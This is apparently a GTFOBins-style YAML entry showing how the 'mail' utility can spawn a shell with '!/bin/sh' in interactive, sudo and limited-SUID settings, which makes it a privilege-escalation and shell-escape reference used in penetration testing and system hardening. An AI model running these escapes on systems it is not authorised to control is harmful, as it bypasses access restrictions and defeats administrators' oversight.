---
functions:
  execute-interactive:
    - code: |
        mail -f /etc/hosts
        !/bin/sh
  sudo-enabled:
    - code: |
        sudo mail -f /etc/hosts
        !/bin/sh
  suid-limited:
    - code: |-
        ./mail -f /etc/hosts
        !/bin/sh
---
